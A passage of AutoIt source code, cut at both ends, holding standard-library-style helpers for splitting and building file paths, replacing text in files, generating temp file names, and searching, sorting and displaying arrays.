		If $ASFROM [ $I ] <> $ASTO [ $I ] Then
			$IDIFF = $I
			ExitLoop
		EndIf
		$I += 1
	WEnd
	$I = 1
	Local $SRELPATH = ""
	For $J = 1 To $ASTO [ 0 ]
		If $I >= $IDIFF Then
			$SRELPATH &= "\" & $ASTO [ $I ]
		EndIf
		$I += 1
	Next
	$SRELPATH = StringTrimLeft ( $SRELPATH , 1 )
	$I = 1
	For $J = 1 To $ASFROM [ 0 ]
		If $I > $IDIFF Then
			$SRELPATH = "..\" & $SRELPATH
		EndIf
		$I += 1
	Next
	If StringRight ( $SRELPATH , 1 ) == "\" Then $SRELPATH = StringTrimRight ( $SRELPATH , 1 )
	Return $SRELPATH
EndFunc
Func _PATHMAKE ( $SZDRIVE , $SZDIR , $SZFNAME , $SZEXT )
	If StringLen ( $SZDRIVE ) Then
		If Not ( StringLeft ( $SZDRIVE , 2 ) = "\\" ) Then $SZDRIVE = StringLeft ( $SZDRIVE , 1 ) & ":"
	EndIf
	If StringLen ( $SZDIR ) Then
		If Not ( StringRight ( $SZDIR , 1 ) = "\" ) And Not ( StringRight ( $SZDIR , 1 ) = "/" ) Then $SZDIR = $SZDIR & "\"
	EndIf
	If StringLen ( $SZEXT ) Then
		If Not ( StringLeft ( $SZEXT , 1 ) = "." ) Then $SZEXT = "." & $SZEXT
	EndIf
	Return $SZDRIVE & $SZDIR & $SZFNAME & $SZEXT
EndFunc
Func _PATHSPLIT ( $SZPATH , ByRef $SZDRIVE , ByRef $SZDIR , ByRef $SZFNAME , ByRef $SZEXT )
	Local $DRIVE = ""
	Local $DIR = ""
	Local $FNAME = ""
	Local $EXT = ""
	Local $POS
	Local $ARRAY [ 5 ]
	$ARRAY [ 0 ] = $SZPATH
	If StringMid ( $SZPATH , 2 , 1 ) = ":" Then
		$DRIVE = StringLeft ( $SZPATH , 2 )
		$SZPATH = StringTrimLeft ( $SZPATH , 2 )
	ElseIf StringLeft ( $SZPATH , 2 ) = "\\" Then
		$SZPATH = StringTrimLeft ( $SZPATH , 2 )
		$POS = StringInStr ( $SZPATH , "\" )
		If $POS = 0 Then $POS = StringInStr ( $SZPATH , "/" )
		If $POS = 0 Then
			$DRIVE = "\\" & $SZPATH
			$SZPATH = ""
		Else
			$DRIVE = "\\" & StringLeft ( $SZPATH , $POS - 1 )
			$SZPATH = StringTrimLeft ( $SZPATH , $POS - 1 )
		EndIf
	EndIf
	Local $NPOSFORWARD = StringInStr ( $SZPATH , "/" , 0 , - 1 )
	Local $NPOSBACKWARD = StringInStr ( $SZPATH , "\" , 0 , - 1 )
	If $NPOSFORWARD >= $NPOSBACKWARD Then
		$POS = $NPOSFORWARD
	Else
		$POS = $NPOSBACKWARD
	EndIf
	$DIR = StringLeft ( $SZPATH , $POS )
	$FNAME = StringRight ( $SZPATH , StringLen ( $SZPATH ) - $POS )
	If StringLen ( $DIR ) = 0 Then $FNAME = $SZPATH
	$POS = StringInStr ( $FNAME , "." , 0 , - 1 )
	If $POS Then
		$EXT = StringRight ( $FNAME , StringLen ( $FNAME ) - ( $POS - 1 ) )
		$FNAME = StringLeft ( $FNAME , $POS - 1 )
	EndIf
	$SZDRIVE = $DRIVE
	$SZDIR = $DIR
	$SZFNAME = $FNAME
	$SZEXT = $EXT
	$ARRAY [ 1 ] = $DRIVE
	$ARRAY [ 2 ] = $DIR
	$ARRAY [ 3 ] = $FNAME
	$ARRAY [ 4 ] = $EXT
	Return $ARRAY
EndFunc
Func _REPLACESTRINGINFILE ( $SZFILENAME , $SZSEARCHSTRING , $SZREPLACESTRING , $FCASENESS = 0 , $FOCCURANCE = 1 )
	Local $IRETVAL = 0
	Local $NCOUNT , $SENDSWITH
	If StringInStr ( FileGetAttrib ( $SZFILENAME ) , "R" ) Then Return SetError ( 6 , 0 , - 1 )
	Local $HFILE = FileOpen ( $SZFILENAME , $FO_READ )
	If $HFILE = - 1 Then Return SetError ( 1 , 0 , - 1 )
	Local $S_TOTFILE = FileRead ( $HFILE , FileGetSize ( $SZFILENAME ) )
	If StringRight ( $S_TOTFILE , 2 ) = @CRLF Then
		$SENDSWITH = @CRLF
	ElseIf StringRight ( $S_TOTFILE , 1 ) = @CR Then
		$SENDSWITH = @CR
	ElseIf StringRight ( $S_TOTFILE , 1 ) = @LF Then
		$SENDSWITH = @LF
	Else
		$SENDSWITH = ""
	EndIf
	Local $AFILELINES = StringSplit ( StringStripCR ( $S_TOTFILE ) , @LF )
	FileClose ( $HFILE )
	Local $IENCODING = FileGetEncoding ( $SZFILENAME )
	Local $HWRITEHANDLE = FileOpen ( $SZFILENAME , $IENCODING + $FO_OVERWRITE )
	If $HWRITEHANDLE = - 1 Then Return SetError ( 2 , 0 , - 1 )
	For $NCOUNT = 1 To $AFILELINES [ 0 ]
		If StringInStr ( $AFILELINES [ $NCOUNT ] , $SZSEARCHSTRING , $FCASENESS ) Then
			$AFILELINES [ $NCOUNT ] = StringReplace ( $AFILELINES [ $NCOUNT ] , $SZSEARCHSTRING , $SZREPLACESTRING , 1 - $FOCCURANCE , $FCASENESS )
			$IRETVAL = $IRETVAL + 1
			If $FOCCURANCE = 0 Then
				$IRETVAL = 1
				ExitLoop
			EndIf
		EndIf
	Next
	For $NCOUNT = 1 To $AFILELINES [ 0 ] - 1
		If FileWriteLine ( $HWRITEHANDLE , $AFILELINES [ $NCOUNT ] ) = 0 Then
			FileClose ( $HWRITEHANDLE )
			Return SetError ( 3 , 0 , - 1 )
		EndIf
	Next
	If $AFILELINES [ $NCOUNT ] <> "" Then FileWrite ( $HWRITEHANDLE , $AFILELINES [ $NCOUNT ] & $SENDSWITH )
	FileClose ( $HWRITEHANDLE )
	Return $IRETVAL
EndFunc
Func _TEMPFILE ( $S_DIRECTORYNAME = @TempDir , $S_FILEPREFIX = "~" , $S_FILEEXTENSION = ".tmp" , $I_RANDOMLENGTH = 7 )
	If IsKeyword ( $S_FILEPREFIX ) Then $S_FILEPREFIX = "~"
	If IsKeyword ( $S_FILEEXTENSION ) Then $S_FILEEXTENSION = ".tmp"
	If IsKeyword ( $I_RANDOMLENGTH ) Then $I_RANDOMLENGTH = 7
	If Not FileExists ( $S_DIRECTORYNAME ) Then $S_DIRECTORYNAME = @TempDir
	If Not FileExists ( $S_DIRECTORYNAME ) Then $S_DIRECTORYNAME = @ScriptDir
	If StringRight ( $S_DIRECTORYNAME , 1 ) <> "\" Then $S_DIRECTORYNAME = $S_DIRECTORYNAME & "\"
	Local $S_TEMPNAME
	Do
		$S_TEMPNAME = ""
		While StringLen ( $S_TEMPNAME ) < $I_RANDOMLENGTH
			$S_TEMPNAME = $S_TEMPNAME & Chr ( Random ( 97 , 122 , 1 ) )
		WEnd
		$S_TEMPNAME = $S_DIRECTORYNAME & $S_FILEPREFIX & $S_TEMPNAME & $S_FILEEXTENSION
	Until Not FileExists ( $S_TEMPNAME )
	Return $S_TEMPNAME
EndFunc
Func _ARRAYADD ( ByRef $AVARRAY , $VVALUE )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , - 1 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 2 , 0 , - 1 )
	Local $IUBOUND = UBound ( $AVARRAY )
	ReDim $AVARRAY [ $IUBOUND + 1 ]
	$AVARRAY [ $IUBOUND ] = $VVALUE
	Return $IUBOUND
EndFunc
Func _ARRAYBINARYSEARCH ( Const ByRef $AVARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , - 1 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 5 , 0 , - 1 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , - 1 )
	Local $IMID = Int ( ( $IEND + $ISTART ) / 2 )
	If $AVARRAY [ $ISTART ] > $VVALUE Or $AVARRAY [ $IEND ] < $VVALUE Then Return SetError ( 2 , 0 , - 1 )
	While $ISTART <= $IMID And $VVALUE <> $AVARRAY [ $IMID ]
		If $VVALUE < $AVARRAY [ $IMID ] Then
			$IEND = $IMID - 1
		Else
			$ISTART = $IMID + 1
		EndIf
		$IMID = Int ( ( $IEND + $ISTART ) / 2 )
	WEnd
	If $ISTART > $IEND Then Return SetError ( 3 , 0 , - 1 )
	Return $IMID
EndFunc
Func _ARRAYCOMBINATIONS ( ByRef $AVARRAY , $ISET , $SDELIM = "" )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $IN = UBound ( $AVARRAY )
	Local $IR = $ISET
	Local $AIDX [ $IR ]
	For $I = 0 To $IR - 1
		$AIDX [ $I ] = $I
	Next
	Local $ITOTAL = __ARRAY_COMBINATIONS ( $IN , $IR )
	Local $ILEFT = $ITOTAL
	Local $ARESULT [ $ITOTAL + 1 ]
	$ARESULT [ 0 ] = $ITOTAL
	Local $ICOUNT = 1
	While $ILEFT > 0
		__ARRAY_GETNEXT ( $IN , $IR , $ILEFT , $ITOTAL , $AIDX )
		For $I = 0 To $ISET - 1
			$ARESULT [ $ICOUNT ] &= $AVARRAY [ $AIDX [ $I ] ] & $SDELIM
		Next
		If $SDELIM <> "" Then $ARESULT [ $ICOUNT ] = StringTrimRight ( $ARESULT [ $ICOUNT ] , 1 )
		$ICOUNT += 1
	WEnd
	Return $ARESULT
EndFunc
Func _ARRAYCONCATENATE ( ByRef $AVARRAYTARGET , Const ByRef $AVARRAYSOURCE , $ISTART = 0 )
	If Not IsArray ( $AVARRAYTARGET ) Then Return SetError ( 1 , 0 , 0 )
	If Not IsArray ( $AVARRAYSOURCE ) Then Return SetError ( 2 , 0 , 0 )
	If UBound ( $AVARRAYTARGET , 0 ) <> 1 Then
		If UBound ( $AVARRAYSOURCE , 0 ) <> 1 Then Return SetError ( 5 , 0 , 0 )
		Return SetError ( 3 , 0 , 0 )
	EndIf
	If UBound ( $AVARRAYSOURCE , 0 ) <> 1 Then Return SetError ( 4 , 0 , 0 )
	Local $IUBOUNDTARGET = UBound ( $AVARRAYTARGET ) - $ISTART , $IUBOUNDSOURCE = UBound ( $AVARRAYSOURCE )
	ReDim $AVARRAYTARGET [ $IUBOUNDTARGET + $IUBOUNDSOURCE ]
	For $I = $ISTART To $IUBOUNDSOURCE - 1
		$AVARRAYTARGET [ $IUBOUNDTARGET + $I ] = $AVARRAYSOURCE [ $I ]
	Next
	Return $IUBOUNDTARGET + $IUBOUNDSOURCE
EndFunc
Func _ARRAYCREATE ( $V_0 , $V_1 = 0 , $V_2 = 0 , $V_3 = 0 , $V_4 = 0 , $V_5 = 0 , $V_6 = 0 , $V_7 = 0 , $V_8 = 0 , $V_9 = 0 , $V_10 = 0 , $V_11 = 0 , $V_12 = 0 , $V_13 = 0 , $V_14 = 0 , $V_15 = 0 , $V_16 = 0 , $V_17 = 0 , $V_18 = 0 , $V_19 = 0 , $V_20 = 0 )
	Local $AV_ARRAY [ 21 ] = [ $V_0 , $V_1 , $V_2 , $V_3 , $V_4 , $V_5 , $V_6 , $V_7 , $V_8 , $V_9 , $V_10 , $V_11 , $V_12 , $V_13 , $V_14 , $V_15 , $V_16 , $V_17 , $V_18 , $V_19 , $V_20 ]
	ReDim $AV_ARRAY [ @NumParams ]
	Return $AV_ARRAY
EndFunc
Func _ARRAYDELETE ( ByRef $AVARRAY , $IELEMENT )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IUBOUND = UBound ( $AVARRAY , 1 ) - 1
	If Not $IUBOUND Then
		$AVARRAY = ""
		Return 0
	EndIf
	If $IELEMENT < 0 Then $IELEMENT = 0
	If $IELEMENT > $IUBOUND Then $IELEMENT = $IUBOUND
	Switch UBound ( $AVARRAY , 0 )
	Case 1
		For $I = $IELEMENT To $IUBOUND - 1
			$AVARRAY [ $I ] = $AVARRAY [ $I + 1 ]
		Next
		ReDim $AVARRAY [ $IUBOUND ]
	Case 2
		Local $ISUBMAX = UBound ( $AVARRAY , 2 ) - 1
		For $I = $IELEMENT To $IUBOUND - 1
			For $J = 0 To $ISUBMAX
				$AVARRAY [ $I ] [ $J ] = $AVARRAY [ $I + 1 ] [ $J ]
			Next
		Next
		ReDim $AVARRAY [ $IUBOUND ] [ $ISUBMAX + 1 ]
Case Else
		Return SetError ( 3 , 0 , 0 )
	EndSwitch
	Return $IUBOUND
EndFunc
Func _ARRAYDISPLAY ( Const ByRef $AVARRAY , $STITLE = "Array: ListView Display" , $IITEMLIMIT = - 1 , $ITRANSPOSE = 0 , $SSEPARATOR = "" , $SREPLACE = "|" , $SHEADER = "" )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IDIMENSION = UBound ( $AVARRAY , 0 ) , $IUBOUND = UBound ( $AVARRAY , 1 ) - 1 , $ISUBMAX = UBound ( $AVARRAY , 2 ) - 1
	If $IDIMENSION > 2 Then Return SetError ( 2 , 0 , 0 )
	If $SSEPARATOR = "" Then $SSEPARATOR = Chr ( 124 )
	If _ARRAYSEARCH ( $AVARRAY , $SSEPARATOR , 0 , 0 , 0 , 1 ) <> - 1 Then
		For $X = 1 To 255
			If $X >= 32 And $X <= 127 Then ContinueLoop
			Local $SFIND = _ARRAYSEARCH ( $AVARRAY , Chr ( $X ) , 0 , 0 , 0 , 1 )
			If $SFIND = - 1 Then
				$SSEPARATOR = Chr ( $X )
				ExitLoop
			EndIf
		Next
	EndIf
	Local $VTMP , $IBUFFER = 4094
	Local $ICOLLIMIT = 250
	Local $IONEVENTMODE = Opt ( "GUIOnEventMode" , 0 ) , $SDATASEPARATORCHAR = Opt ( "GUIDataSeparatorChar" , $SSEPARATOR )
	If $ISUBMAX < 0 Then $ISUBMAX = 0
	If $ITRANSPOSE Then
		$VTMP = $IUBOUND
		$IUBOUND = $ISUBMAX
		$ISUBMAX = $VTMP
	EndIf
	If $ISUBMAX > $ICOLLIMIT Then $ISUBMAX = $ICOLLIMIT
	If $IITEMLIMIT < 1 Then $IITEMLIMIT = $IUBOUND
	If $IUBOUND > $IITEMLIMIT Then $IUBOUND = $IITEMLIMIT
	If $SHEADER = "" Then
		$SHEADER = "Row  "
		For $I = 0 To $ISUBMAX
			$SHEADER &= $SSEPARATOR & "Col " & $I
		Next
	EndIf
	Local $AVARRAYTEXT [ $IUBOUND + 1 ]
	For $I = 0 To $IUBOUND
		$AVARRAYTEXT [ $I ] = "[" & $I & "]"
		For $J = 0 To $ISUBMAX
			If $IDIMENSION = 1 Then
				If $ITRANSPOSE Then
					$VTMP = $AVARRAY [ $J ]
				Else
					$VTMP = $AVARRAY [ $I ]
				EndIf
			Else
				If $ITRANSPOSE Then
					$VTMP = $AVARRAY [ $J ] [ $I ]
				Else
					$VTMP = $AVARRAY [ $I ] [ $J ]
				EndIf
			EndIf
			$VTMP = StringReplace ( $VTMP , $SSEPARATOR , $SREPLACE , 0 , 1 )
			If StringLen ( $VTMP ) > $IBUFFER Then $VTMP = StringLeft ( $VTMP , $IBUFFER )
			$AVARRAYTEXT [ $I ] &= $SSEPARATOR & $VTMP
		Next
	Next
	Local Const $_ARRAYCONSTANT_GUI_DOCKBORDERS = 102
	Local Const $_ARRAYCONSTANT_GUI_DOCKBOTTOM = 64
	Local Const $_ARRAYCONSTANT_GUI_DOCKHEIGHT = 512
	Local Const $_ARRAYCONSTANT_GUI_DOCKLEFT = 2
	Local Const $_ARRAYCONSTANT_GUI_DOCKRIGHT = 4
	Local Const $_ARRAYCONSTANT_GUI_EVENT_CLOSE = - 3
	Local Const $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH = ( 4096 + 29 )
	Local Const $_ARRAYCONSTANT_LVM_GETITEMCOUNT = ( 4096 + 4 )
	Local Const $_ARRAYCONSTANT_LVM_GETITEMSTATE = ( 4096 + 44 )
	Local Const $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE = ( 4096 + 54 )
	Local Const $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT = 32
	Local Const $_ARRAYCONSTANT_LVS_EX_GRIDLINES = 1
	Local Const $_ARRAYCONSTANT_LVS_SHOWSELALWAYS = 8
	Local Const $_ARRAYCONSTANT_WS_EX_CLIENTEDGE = 512
	Local Const $_ARRAYCONSTANT_WS_MAXIMIZEBOX = 65536
	Local Const $_ARRAYCONSTANT_WS_MINIMIZEBOX = 131072
	Local Const $_ARRAYCONSTANT_WS_SIZEBOX = 262144
	Local $IWIDTH = 640 , $IHEIGHT = 480
	Local $HGUI = GUICreate ( $STITLE , $IWIDTH , $IHEIGHT , Default , Default , BitOR ( $_ARRAYCONSTANT_WS_SIZEBOX , $_ARRAYCONSTANT_WS_MINIMIZEBOX , $_ARRAYCONSTANT_WS_MAXIMIZEBOX ) )
	Local $AIGUISIZE = WinGetClientSize ( $HGUI )
	Local $HLISTVIEW = GUICtrlCreateListView ( $SHEADER , 0 , 0 , $AIGUISIZE [ 0 ] , $AIGUISIZE [ 1 ] - 26 , $_ARRAYCONSTANT_LVS_SHOWSELALWAYS )
	Local $HCOPY = GUICtrlCreateButton ( "Copy Selected" , 3 , $AIGUISIZE [ 1 ] - 23 , $AIGUISIZE [ 0 ] - 6 , 20 )
	GUICtrlSetResizing ( $HLISTVIEW , $_ARRAYCONSTANT_GUI_DOCKBORDERS )
	GUICtrlSetResizing ( $HCOPY , $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSendMsg ( $HLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_LVS_EX_GRIDLINES , $_ARRAYCONSTANT_LVS_EX_GRIDLINES )
	GUICtrlSendMsg ( $HLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT , $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT )
	GUICtrlSendMsg ( $HLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_WS_EX_CLIENTEDGE , $_ARRAYCONSTANT_WS_EX_CLIENTEDGE )
	For $I = 0 To $IUBOUND
		GUICtrlCreateListViewItem ( $AVARRAYTEXT [ $I ] , $HLISTVIEW )
	Next
	$IWIDTH = 0
	For $I = 0 To $ISUBMAX + 1
		$IWIDTH += GUICtrlSendMsg ( $HLISTVIEW , $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH , $I , 0 )
	Next
	If $IWIDTH < 250 Then $IWIDTH = 230
	$IWIDTH += 20
	If $IWIDTH > @DesktopWidth Then $IWIDTH = @DesktopWidth - 100
	WinMove ( $HGUI , "" , ( @DesktopWidth - $IWIDTH ) / 2 , Default , $IWIDTH )
	GUISetState ( @SW_SHOW , $HGUI )
	While 1
		Switch GUIGetMsg ( )
		Case $_ARRAYCONSTANT_GUI_EVENT_CLOSE
			ExitLoop
		Case $HCOPY
			Local $SCLIP = ""
			Local $AICURITEMS [ 1 ] = [ 0 ]
			For $I = 0 To GUICtrlSendMsg ( $HLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMCOUNT , 0 , 0 )
				If GUICtrlSendMsg ( $HLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMSTATE , $I , 2 ) Then
					$AICURITEMS [ 0 ] += 1
					ReDim $AICURITEMS [ $AICURITEMS [ 0 ] + 1 ]
					$AICURITEMS [ $AICURITEMS [ 0 ] ] = $I
				EndIf
			Next
			If Not $AICURITEMS [ 0 ] Then
				For $SITEM In $AVARRAYTEXT
					$SCLIP &= $SITEM & @CRLF
				Next
			Else
				For $I = 1 To UBound ( $AICURITEMS ) - 1
					$SCLIP &= $AVARRAYTEXT [ $AICURITEMS [ $I ] ] & @CRLF
				Next
			EndIf
			ClipPut ( $SCLIP )
		EndSwitch
	WEnd
	GUIDelete ( $HGUI )
	Opt ( "GUIOnEventMode" , $IONEVENTMODE )
	Opt ( "GUIDataSeparatorChar" , $SDATASEPARATORCHAR )
	Return 1
EndFunc
Func _ARRAYFINDALL ( Const ByRef $AVARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICASE = 0 , $ICOMPARE = 0 , $ISUBITEM = 0 )
	$ISTART = _ARRAYSEARCH ( $AVARRAY , $VVALUE , $ISTART , $IEND , $ICASE , $ICOMPARE , 1 , $ISUBITEM )
	If @error Then Return SetError ( @error , 0 , - 1 )
	Local $IINDEX = 0 , $AVRESULT [ UBound ( $AVARRAY ) ]
	Do
		$AVRESULT [ $IINDEX ] = $ISTART
		$IINDEX += 1
		$ISTART = _ARRAYSEARCH ( $AVARRAY , $VVALUE , $ISTART + 1 , $IEND , $ICASE , $ICOMPARE , 1 , $ISUBITEM )
	Until @error
	ReDim $AVRESULT [ $IINDEX ]
	Return $AVRESULT
EndFunc
Func _ARRAYINSERT ( ByRef $AVARRAY , $IELEMENT , $VVALUE = "" )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $IUBOUND = UBound ( $AVARRAY ) + 1
	ReDim $AVARRAY [ $IUBOUND ]
	For $I = $IUBOUND - 1 To $IELEMENT + 1 Step - 1
		$AVARRAY [ $I ] = $AVARRAY [ $I - 1 ]
	Next
	$AVARRAY [ $IELEMENT ] = $VVALUE
	Return $IUBOUND
EndFunc
Func _ARRAYMAX ( Const ByRef $AVARRAY , $ICOMPNUMERIC = 0 , $ISTART = 0 , $IEND = 0 )
	Local $IRESULT = _ARRAYMAXINDEX ( $AVARRAY , $ICOMPNUMERIC , $ISTART , $IEND )
	If @error Then Return SetError ( @error , 0 , "" )
	Return $AVARRAY [ $IRESULT ]
EndFunc
Func _ARRAYMAXINDEX ( Const ByRef $AVARRAY , $ICOMPNUMERIC = 0 , $ISTART = 0 , $IEND = 0 )
	If Not IsArray ( $AVARRAY ) Or UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 1 , 0 , - 1 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 3 , 0 , - 1 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , - 1 )
	Local $IMAXINDEX = $ISTART
	If $ICOMPNUMERIC Then
		For $I = $ISTART To $IEND
			If Number ( $AVARRAY [ $IMAXINDEX ] ) < Number ( $AVARRAY [ $I ] ) Then $IMAXINDEX = $I
		Next
	Else
		For $I = $ISTART To $IEND
			If $AVARRAY [ $IMAXINDEX ] < $AVARRAY [ $I ] Then $IMAXINDEX = $I
		Next
	EndIf
	Return $IMAXINDEX
EndFunc
Func _ARRAYMIN ( Const ByRef $AVARRAY , $ICOMPNUMERIC = 0 , $ISTART = 0 , $IEND = 0 )
	Local $IRESULT = _ARRAYMININDEX ( $AVARRAY , $ICOMPNUMERIC , $ISTART , $IEND )
	If @error Then Return SetError ( @error , 0 , "" )
	Return $AVARRAY [ $IRESULT ]
EndFunc
Func _ARRAYMININDEX ( Const ByRef $AVARRAY , $ICOMPNUMERIC = 0 , $ISTART = 0 , $IEND = 0 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , - 1 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 3 , 0 , - 1 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , - 1 )
	Local $IMININDEX = $ISTART
	If $ICOMPNUMERIC Then
		For $I = $ISTART To $IEND
			If Number ( $AVARRAY [ $IMININDEX ] ) > Number ( $AVARRAY [ $I ] ) Then $IMININDEX = $I
		Next
	Else
		For $I = $ISTART To $IEND
			If $AVARRAY [ $IMININDEX ] > $AVARRAY [ $I ] Then $IMININDEX = $I
		Next
	EndIf
	Return $IMININDEX
EndFunc
Func _ARRAYPERMUTE ( ByRef $AVARRAY , $SDELIM = "" )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $ISIZE = UBound ( $AVARRAY ) , $IFACTORIAL = 1 , $AIDX [ $ISIZE ] , $ARESULT [ 1 ] , $ICOUNT = 1
	For $I = 0 To $ISIZE - 1
		$AIDX [ $I ] = $I
	Next
	For $I = $ISIZE To 1 Step - 1
		$IFACTORIAL *= $I
	Next
	ReDim $ARESULT [ $IFACTORIAL + 1 ]
	$ARESULT [ 0 ] = $IFACTORIAL
	__ARRAY_EXETERINTERNAL ( $AVARRAY , 0 , $ISIZE , $SDELIM , $AIDX , $ARESULT , $ICOUNT )
	Return $ARESULT
EndFunc
Func _ARRAYPOP ( ByRef $AVARRAY )
	If ( Not IsArray ( $AVARRAY ) ) Then Return SetError ( 1 , 0 , "" )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 2 , 0 , "" )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1 , $SLASTVAL = $AVARRAY [ $IUBOUND ]
	If Not $IUBOUND Then
		$AVARRAY = ""
	Else
		ReDim $AVARRAY [ $IUBOUND ]
	EndIf
	Return $SLASTVAL
EndFunc
Func _ARRAYPUSH ( ByRef $AVARRAY , $VVALUE , $IDIRECTION = 0 )
	If ( Not IsArray ( $AVARRAY ) ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 3 , 0 , 0 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If IsArray ( $VVALUE ) Then
		Local $IUBOUNDS = UBound ( $VVALUE )
		If ( $IUBOUNDS - 1 ) > $IUBOUND Then Return SetError ( 2 , 0 , 0 )
		If $IDIRECTION Then
			For $I = $IUBOUND To $IUBOUNDS Step - 1
				$AVARRAY [ $I ] = $AVARRAY [ $I - $IUBOUNDS ]
			Next
			For $I = 0 To $IUBOUNDS - 1
				$AVARRAY [ $I ] = $VVALUE [ $I ]
			Next
		Else
			For $I = 0 To $IUBOUND - $IUBOUNDS
				$AVARRAY [ $I ] = $AVARRAY [ $I + $IUBOUNDS ]
			Next
			For $I = 0 To $IUBOUNDS - 1
				$AVARRAY [ $I + $IUBOUND - $IUBOUNDS + 1 ] = $VVALUE [ $I ]
			Next
		EndIf
	Else
		If $IDIRECTION Then
			For $I = $IUBOUND To 1 Step - 1
				$AVARRAY [ $I ] = $AVARRAY [ $I - 1 ]
			Next
			$AVARRAY [ 0 ] = $VVALUE
		Else
			For $I = 0 To $IUBOUND - 1
				$AVARRAY [ $I ] = $AVARRAY [ $I + 1 ]
			Next
			$AVARRAY [ $IUBOUND ] = $VVALUE
		EndIf
	EndIf
	Return 1
EndFunc
Func _ARRAYREVERSE ( ByRef $AVARRAY , $ISTART = 0 , $IEND = 0 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 3 , 0 , 0 )
	Local $VTMP , $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , 0 )
	For $I = $ISTART To Int ( ( $ISTART + $IEND - 1 ) / 2 )
		$VTMP = $AVARRAY [ $I ]
		$AVARRAY [ $I ] = $AVARRAY [ $IEND ]
		$AVARRAY [ $IEND ] = $VTMP
		$IEND -= 1
	Next
	Return 1
EndFunc
Func _ARRAYSEARCH ( Const ByRef $AVARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICASE = 0 , $ICOMPARE = 0 , $IFORWARD = 1 , $ISUBITEM = - 1 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , - 1 )
	If UBound ( $AVARRAY , 0 ) > 2 Or UBound ( $AVARRAY , 0 ) < 1 Then Return SetError ( 2 , 0 , - 1 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , - 1 )
	Local $ISTEP = 1
	If Not $IFORWARD Then
		Local $ITMP = $ISTART
		$ISTART = $IEND
		$IEND = $ITMP
		$ISTEP = - 1
	EndIf
	Local $ICOMPTYPE = False
	If $ICOMPARE = 2 Then
		$ICOMPARE = 0
		$ICOMPTYPE = True
	EndIf
	Switch UBound ( $AVARRAY , 0 )
	Case 1
		If Not $ICOMPARE Then
			If Not $ICASE Then
				For $I = $ISTART To $IEND Step $ISTEP
					If $ICOMPTYPE And VarGetType ( $AVARRAY [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
					If $AVARRAY [ $I ] = $VVALUE Then Return $I
				Next
			Else
				For $I = $ISTART To $IEND Step $ISTEP
					If $ICOMPTYPE And VarGetType ( $AVARRAY [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
					If $AVARRAY [ $I ] == $VVALUE Then Return $I
				Next
			EndIf
